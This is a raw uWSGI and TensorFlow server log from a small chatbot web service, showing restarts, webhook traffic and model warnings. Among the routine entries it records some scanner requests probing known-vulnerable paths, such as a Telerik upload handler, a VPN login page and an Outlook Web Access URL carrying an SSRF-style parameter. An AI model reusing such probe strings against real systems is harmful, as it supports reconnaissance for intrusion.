2020-09-04 07:56:04.496582: I tensorflow/compiler/xla/service/service.cc:168] XLA service 0x55a00c12e390 initialized for platform Host (this does not guarantee that XLA will be used). Devices:
2020-09-04 07:56:04.496601: I tensorflow/compiler/xla/service/service.cc:176]   StreamExecutor device (0): Host, Default Version
2020-09-04 07:56:04.785518: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-09-04 07:56:04.786942: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-09-04 07:56:04.788341: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
[pid: 5086|app: 0|req: 1/1] 66.102.6.201 () {42 vars in 542 bytes} [Fri Sep  4 07:55:55 2020] POST /webhook/ => generated 181 bytes in 9487 msecs (HTTP/1.1 200) 4 headers in 128 bytes (1 switches on core 0)
[pid: 5086|app: 0|req: 2/2] 66.102.6.203 () {42 vars in 542 bytes} [Fri Sep  4 07:56:04 2020] POST /webhook/ => generated 181 bytes in 0 msecs (HTTP/1.1 200) 4 headers in 128 bytes (1 switches on core 0)
['chatting']
['chatting']
[[1]]
[[0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1]]
2020-09-04 07:56:06.309311: I tensorflow/compiler/mlir/mlir_graph_optimization_pass.cc:118] None of the MLIR optimization passes are enabled (registered 1)
2020-09-04 07:56:06.618116: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-09-04 07:56:06.619600: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-09-04 07:56:06.621055: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
52.39%   .

[pid: 5086|app: 0|req: 3/3] 66.102.6.201 () {42 vars in 542 bytes} [Fri Sep  4 07:56:05 2020] POST /webhook/ => generated 73 bytes in 1070 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
[pid: 5086|app: 0|req: 4/4] 66.249.84.11 () {42 vars in 542 bytes} [Fri Sep  4 07:56:25 2020] POST /webhook/ => generated 181 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 128 bytes (1 switches on core 0)
['chatting']
['chatting']
[[1]]
[[0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1]]
52.39%   .

[pid: 5086|app: 0|req: 5/5] 66.249.84.9 () {42 vars in 541 bytes} [Fri Sep  4 07:56:25 2020] POST /webhook/ => generated 73 bytes in 42 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
[pid: 5086|app: 0|req: 6/6] 66.249.83.43 () {42 vars in 542 bytes} [Fri Sep  4 07:56:57 2020] POST /webhook/ => generated 181 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 128 bytes (1 switches on core 0)
['chatting']
['chatting']
[[1]]
[[0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1]]
52.39%   .

[pid: 5086|app: 0|req: 7/7] 66.249.83.45 () {42 vars in 542 bytes} [Fri Sep  4 07:56:58 2020] POST /webhook/ => generated 73 bytes in 43 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
[pid: 5086|app: 0|req: 8/8] 66.249.84.9 () {42 vars in 541 bytes} [Fri Sep  4 07:57:29 2020] POST /webhook/ => generated 181 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 128 bytes (1 switches on core 0)
['chatting']
['chatting']
[[1]]
[[0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1]]
52.39%   .

[pid: 5086|app: 0|req: 9/9] 66.249.84.11 () {42 vars in 542 bytes} [Fri Sep  4 07:57:29 2020] POST /webhook/ => generated 73 bytes in 42 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
*** Starting uWSGI 2.0.18 (64bit) on [Mon Oct 19 04:50:23 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.4.0-1028-aws #29~18.04.1-Ubuntu SMP Tue Oct 6 17:14:23 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Oct  8 2020, 12:12:24)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x55a919235cf0
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x55a919235cf0 pid: 3819 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 3819, cores: 1)
2020-10-19 04:50:45.294109: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcudart.so.10.1'; dlerror: libcudart.so.10.1: cannot open shared object file: No such file or directory
2020-10-19 04:50:45.294144: I tensorflow/stream_executor/cuda/cudart_stub.cc:29] Ignore above cudart dlerror if you do not have a GPU set up on your machine.


2020-10-19 04:50:59.794096: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcuda.so.1'; dlerror: libcuda.so.1: cannot open shared object file: No such file or directory
2020-10-19 04:50:59.794124: W tensorflow/stream_executor/cuda/cuda_driver.cc:312] failed call to cuInit: UNKNOWN ERROR (303)
2020-10-19 04:50:59.794142: I tensorflow/stream_executor/cuda/cuda_diagnostics.cc:156] kernel driver does not appear to be running on this host (ip-172-31-43-194): /proc/driver/nvidia/version does not exist
2020-10-19 04:50:59.794359: I tensorflow/core/platform/cpu_feature_guard.cc:142] This TensorFlow binary is optimized with oneAPI Deep Neural Network Library (oneDNN) to use the following CPU instructions in performance-critical operations:  AVX2 FMA
To enable them in other operations, rebuild TensorFlow with the appropriate compiler flags.
2020-10-19 04:50:59.836265: I tensorflow/core/platform/profile_utils/cpu_utils.cc:104] CPU Frequency: 2199825000 Hz
2020-10-19 04:50:59.836685: I tensorflow/compiler/xla/service/service.cc:168] XLA service 0x55a91e1294c0 initialized for platform Host (this does not guarantee that XLA will be used). Devices:
2020-10-19 04:50:59.836703: I tensorflow/compiler/xla/service/service.cc:176]   StreamExecutor device (0): Host, Default Version
2020-10-19 04:51:00.768592: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-10-19 04:51:00.770064: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-10-19 04:51:00.771438: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
[pid: 3819|app: 0|req: 1/1] 220.68.167.158 () {50 vars in 861 bytes} [Mon Oct 19 04:50:43 2020] GET / => generated 1365 bytes in 18086 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
Not Found: /favicon.ico
[pid: 3819|app: 0|req: 2/2] 220.68.167.158 () {48 vars in 779 bytes} [Mon Oct 19 04:51:01 2020] GET /favicon.ico => generated 2328 bytes in 6 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 0)
[pid: 3819|app: 0|req: 3/3] 220.68.167.158 () {52 vars in 914 bytes} [Mon Oct 19 04:51:07 2020] GET /chat => generated 0 bytes in 0 msecs (HTTP/1.1 301) 4 headers in 144 bytes (1 switches on core 0)
[pid: 3819|app: 0|req: 4/4] 220.68.167.158 () {52 vars in 916 bytes} [Mon Oct 19 04:51:07 2020] GET /chat/ => generated 1476 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 3819|app: 0|req: 5/5] 66.249.83.205 () {42 vars in 543 bytes} [Mon Oct 19 04:52:08 2020] POST /webhook/ => generated 181 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 128 bytes (1 switches on core 0)
['chatting']
['chatting']
[[1]]
[[0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1]]
2020-10-19 04:52:10.354931: I tensorflow/compiler/mlir/mlir_graph_optimization_pass.cc:118] None of the MLIR optimization passes are enabled (registered 1)
2020-10-19 04:52:10.695675: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-10-19 04:52:10.697169: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-10-19 04:52:10.698570: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
52.39%   .

[pid: 3819|app: 0|req: 6/6] 66.249.83.203 () {42 vars in 543 bytes} [Mon Oct 19 04:52:09 2020] POST /webhook/ => generated 73 bytes in 1286 msecs (HTTP/1.1 200) 4 headers in 127 bytes (1 switches on core 0)
[pid: 3819|app: 0|req: 7/7] 203.237.160.58 () {40 vars in 564 bytes} [Mon Oct 19 05:42:17 2020] GET / => generated 1365 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
Not Found: /favicon.ico
[pid: 3819|app: 0|req: 8/8] 203.237.160.58 () {40 vars in 540 bytes} [Mon Oct 19 05:42:18 2020] GET /favicon.ico => generated 2328 bytes in 4 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 0)
[pid: 3819|app: 0|req: 9/9] 203.237.160.58 () {42 vars in 610 bytes} [Mon Oct 19 05:42:28 2020] GET /chat => generated 0 bytes in 0 msecs (HTTP/1.1 301) 4 headers in 144 bytes (1 switches on core 0)
[pid: 3819|app: 0|req: 10/10] 203.237.160.58 () {42 vars in 612 bytes} [Mon Oct 19 05:42:28 2020] GET /chat/ => generated 1476 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
Not Found: /favicon.ico
[pid: 3819|app: 0|req: 11/11] 203.237.160.58 () {40 vars in 540 bytes} [Mon Oct 19 05:42:30 2020] GET /favicon.ico => generated 2328 bytes in 4 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 0)
[pid: 3819|app: 0|req: 12/12] 34.76.47.142 () {44 vars in 574 bytes} [Mon Oct 19 12:47:23 2020] GET / => generated 1365 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 3819|app: 0|req: 13/13] 71.6.232.7 () {36 vars in 497 bytes} [Mon Oct 19 19:15:21 2020] GET / => generated 1365 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
Not Found: /api/v1
[pid: 3819|app: 0|req: 14/14] 142.93.155.50 () {38 vars in 457 bytes} [Mon Oct 19 22:35:17 2020] GET /api/v1 => generated 2313 bytes in 4 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 0)
[pid: 3819|app: 0|req: 15/15] 139.162.113.204 () {34 vars in 414 bytes} [Tue Oct 20 00:13:28 2020] GET / => generated 1365 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 3819|app: 0|req: 16/16] 74.120.14.51 () {30 vars in 323 bytes} [Tue Oct 20 01:27:44 2020] GET / => generated 1365 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 3819|app: 0|req: 17/17] 74.120.14.51 () {36 vars in 454 bytes} [Tue Oct 20 01:27:45 2020] GET / => generated 1365 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 3819|app: 0|req: 18/18] 209.17.96.26 () {32 vars in 423 bytes} [Tue Oct 20 02:22:57 2020] GET / => generated 1365 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 3819|app: 0|req: 19/19] 83.97.20.29 () {32 vars in 345 bytes} [Tue Oct 20 03:24:58 2020] GET / => generated 1365 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 3819|app: 0|req: 20/20] 162.142.125.50 () {30 vars in 325 bytes} [Tue Oct 20 04:06:08 2020] GET / => generated 1365 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 3819|app: 0|req: 21/21] 162.142.125.50 () {36 vars in 456 bytes} [Tue Oct 20 04:06:09 2020] GET / => generated 1365 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 3819|app: 0|req: 22/22] 184.105.247.196 () {30 vars in 322 bytes} [Tue Oct 20 05:46:35 2020] GET / => generated 1365 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 3819|app: 0|req: 23/23] 192.35.168.32 () {36 vars in 406 bytes} [Tue Oct 20 05:59:01 2020] GET / => generated 1365 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
Not Found: /Telerik.Web.UI.WebResource.axd
[pid: 3819|app: 0|req: 24/24] 128.14.133.58 () {36 vars in 577 bytes} [Tue Oct 20 06:17:10 2020] GET /Telerik.Web.UI.WebResource.axd?type=rau => generated 2394 bytes in 4 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 0)
-- unavailable modifier requested: 3 --
[pid: 3819|app: 0|req: 25/26] 92.118.160.17 () {32 vars in 465 bytes} [Tue Oct 20 07:54:33 2020] GET / => generated 1365 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 3819|app: 0|req: 26/27] 42.157.192.132 () {30 vars in 321 bytes} [Tue Oct 20 08:09:19 2020] GET / => generated 1365 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
-- unavailable modifier requested: 3 --
Not Found: /remote/login
[pid: 3819|app: 0|req: 27/29] 128.14.134.170 () {36 vars in 525 bytes} [Tue Oct 20 10:11:41 2020] GET /remote/login => generated 2331 bytes in 4 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 0)
invalid request block size: 21573 (max 4096)...skip
invalid request block size: 18515 (max 4096)...skip
[pid: 3819|app: 0|req: 28/30] 192.241.219.22 () {36 vars in 407 bytes} [Tue Oct 20 13:47:58 2020] GET / => generated 1365 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
Not Found: /owa/auth/logon.aspx
[pid: 3819|app: 0|req: 29/31] 192.241.217.152 () {36 vars in 503 bytes} [Tue Oct 20 14:26:19 2020] GET /owa/auth/logon.aspx?url=https%3a%2f%2f1%2fecp%2f => generated 2381 bytes in 4 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 0)
-- unavailable modifier requested: 3 --
[pid: 3819|app: 0|req: 30/33] 209.17.97.74 () {32 vars in 423 bytes} [Tue Oct 20 20:29:41 2020] GET / => generated 1365 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 3819|app: 0|req: 31/34] 193.118.53.194 () {36 vars in 501 bytes} [Tue Oct 20 22:26:34 2020] GET / => generated 1365 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
-- unavailable modifier requested: 4 --
[pid: 3819|app: 0|req: 32/36] 184.105.139.68 () {30 vars in 321 bytes} [Wed Oct 21 05:11:14 2020] GET / => generated 1365 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 3819|app: 0|req: 33/37] 83.97.20.29 () {32 vars in 346 bytes} [Wed Oct 21 06:26:45 2020] GET / => generated 1365 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 3819|app: 0|req: 34/38] 209.17.97.122 () {32 vars in 420 bytes} [Wed Oct 21 07:02:33 2020] GET / => generated 1365 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 3819|app: 0|req: 35/39] 128.14.134.170 () {36 vars in 501 bytes} [Wed Oct 21 07:22:58 2020] GET / => generated 1365 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 3819|app: 0|req: 36/40] 220.68.167.158 () {50 vars in 861 bytes} [Wed Oct 21 07:37:43 2020] GET / => generated 1365 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
Not Found: /favicon.ico
[pid: 3819|app: 0|req: 37/41] 220.68.167.158 () {48 vars in 779 bytes} [Wed Oct 21 07:37:44 2020] GET /favicon.ico => generated 2328 bytes in 3 msecs (HTTP/1.1 404) 4 headers in 129 bytes (1 switches on core 0)
[pid: 3819|app: 0|req: 38/42] 220.68.167.158 () {52 vars in 914 bytes} [Wed Oct 21 07:37:48 2020] GET /chat => generated 0 bytes in 0 msecs (HTTP/1.1 301) 4 headers in 144 bytes (1 switches on core 0)
[pid: 3819|app: 0|req: 39/43] 220.68.167.158 () {52 vars in 916 bytes} [Wed Oct 21 07:37:48 2020] GET /chat/ => generated 1476 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 3819|app: 0|req: 40/44] 66.249.83.201 () {42 vars in 541 bytes} [Wed Oct 21 07:38:18 2020] POST /webhook/ => generated 181 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 128 bytes (1 switches on core 0)
[pid: 3819|app: 0|req: 41/45] 66.249.83.201 () {42 vars in 541 bytes} [Wed Oct 21 07:38:47 2020] POST /webhook/ => generated 181 bytes in 0 msecs (HTTP/1.1 200) 4 headers in 128 bytes (1 switches on core 0)
[pid: 3819|app: 0|req: 42/46] 66.249.83.203 () {42 vars in 541 bytes} [Wed Oct 21 07:38:50 2020] POST /webhook/ => generated 181 bytes in 0 msecs (HTTP/1.1 200) 4 headers in 128 bytes (1 switches on core 0)
[pid: 3819|app: 0|req: 43/47] 180.149.125.173 () {36 vars in 500 bytes} [Wed Oct 21 07:39:36 2020] GET / => generated 1365 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 3819|app: 0|req: 44/48] 66.249.83.201 () {42 vars in 541 bytes} [Wed Oct 21 07:40:58 2020] POST /webhook/ => generated 181 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 128 bytes (1 switches on core 0)
[pid: 3819|app: 0|req: 45/49] 66.249.83.201 () {42 vars in 543 bytes} [Wed Oct 21 07:41:27 2020] POST /webhook/ => generated 181 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 128 bytes (1 switches on core 0)
[pid: 3819|app: 0|req: 46/50] 66.249.83.205 () {42 vars in 543 bytes} [Wed Oct 21 07:42:02 2020] POST /webhook/ => generated 181 bytes in 0 msecs (HTTP/1.1 200) 4 headers in 128 bytes (1 switches on core 0)
[pid: 3819|app: 0|req: 47/51] 66.249.83.201 () {42 vars in 543 bytes} [Wed Oct 21 07:42:06 2020] POST /webhook/ => generated 181 bytes in 0 msecs (HTTP/1.1 200) 4 headers in 128 bytes (1 switches on core 0)
[pid: 3819|app: 0|req: 48/52] 66.249.83.203 () {42 vars in 543 bytes} [Wed Oct 21 07:43:21 2020] POST /webhook/ => generated 181 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 128 bytes (1 switches on core 0)
[pid: 3819|app: 0|req: 49/53] 66.249.83.203 () {42 vars in 543 bytes} [Wed Oct 21 07:43:59 2020] POST /webhook/ => generated 181 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 128 bytes (1 switches on core 0)
[pid: 3819|app: 0|req: 50/54] 66.249.83.201 () {42 vars in 543 bytes} [Wed Oct 21 07:44:59 2020] POST /webhook/ => generated 181 bytes in 0 msecs (HTTP/1.1 200) 4 headers in 128 bytes (1 switches on core 0)
[pid: 3819|app: 0|req: 51/55] 66.249.83.205 () {42 vars in 543 bytes} [Wed Oct 21 07:45:11 2020] POST /webhook/ => generated 181 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 128 bytes (1 switches on core 0)
*** Starting uWSGI 2.0.18 (64bit) on [Wed Oct 21 07:47:22 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.4.0-1028-aws #29~18.04.1-Ubuntu SMP Tue Oct 6 17:14:23 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Oct  8 2020, 12:12:24)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x5585765d2d00
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x5585765d2d00 pid: 13063 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 13063, cores: 1)
2020-10-21 07:47:59.542670: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcudart.so.10.1'; dlerror: libcudart.so.10.1: cannot open shared object file: No such file or directory
2020-10-21 07:47:59.542703: I tensorflow/stream_executor/cuda/cudart_stub.cc:29] Ignore above cudart dlerror if you do not have a GPU set up on your machine.


2020-10-21 07:48:08.228224: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcuda.so.1'; dlerror: libcuda.so.1: cannot open shared object file: No such file or directory
2020-10-21 07:48:08.228253: W tensorflow/stream_executor/cuda/cuda_driver.cc:312] failed call to cuInit: UNKNOWN ERROR (303)
2020-10-21 07:48:08.228271: I tensorflow/stream_executor/cuda/cuda_diagnostics.cc:156] kernel driver does not appear to be running on this host (ip-172-31-43-194): /proc/driver/nvidia/version does not exist
2020-10-21 07:48:08.228482: I tensorflow/core/platform/cpu_feature_guard.cc:142] This TensorFlow binary is optimized with oneAPI Deep Neural Network Library (oneDNN) to use the following CPU instructions in performance-critical operations:  AVX2 FMA
To enable them in other operations, rebuild TensorFlow with the appropriate compiler flags.
2020-10-21 07:48:08.252284: I tensorflow/core/platform/profile_utils/cpu_utils.cc:104] CPU Frequency: 2199825000 Hz
2020-10-21 07:48:08.252659: I tensorflow/compiler/xla/service/service.cc:168] XLA service 0x55857b4c61b0 initialized for platform Host (this does not guarantee that XLA will be used). Devices:
2020-10-21 07:48:08.252675: I tensorflow/compiler/xla/service/service.cc:176]   StreamExecutor device (0): Host, Default Version
2020-10-21 07:48:08.540169: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-10-21 07:48:08.541610: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-10-21 07:48:08.542962: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
[pid: 13063|app: 0|req: 1/1] 220.68.167.158 () {50 vars in 861 bytes} [Wed Oct 21 07:47:59 2020] GET / => generated 1365 bytes in 9774 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 13063|app: 0|req: 2/2] 220.68.167.158 () {52 vars in 916 bytes} [Wed Oct 21 07:48:26 2020] GET /chat/ => generated 1476 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 137 bytes (1 switches on core 0)
[pid: 13063|app: 0|req: 3/3] 66.249.83.201 () {42 vars in 541 bytes} [Wed Oct 21 07:48:33 2020] POST /webhook/ => generated 181 bytes in 1 msecs (HTTP/1.1 200) 4 headers in 128 bytes (1 switches on core 0)
[pid: 13063|app: 0|req: 4/4] 66.249.83.205 () {42 vars in 541 bytes} [Wed Oct 21 07:48:54 2020] POST /webhook/ => generated 181 bytes in 0 msecs (HTTP/1.1 200) 4 headers in 128 bytes (1 switches on core 0)
[pid: 13063|app: 0|req: 5/5] 66.249.83.205 () {42 vars in 543 bytes} [Wed Oct 21 07:48:57 2020] POST /webhook/ => generated 181 bytes in 0 msecs (HTTP/1.1 200) 4 headers in 128 bytes (1 switches on core 0)
*** Starting uWSGI 2.0.18 (64bit) on [Wed Oct 21 07:50:43 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.4.0-1028-aws #29~18.04.1-Ubuntu SMP Tue Oct 6 17:14:23 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Oct  8 2020, 12:12:24)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x56454ce5ed00
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x56454ce5ed00 pid: 13139 (default app)
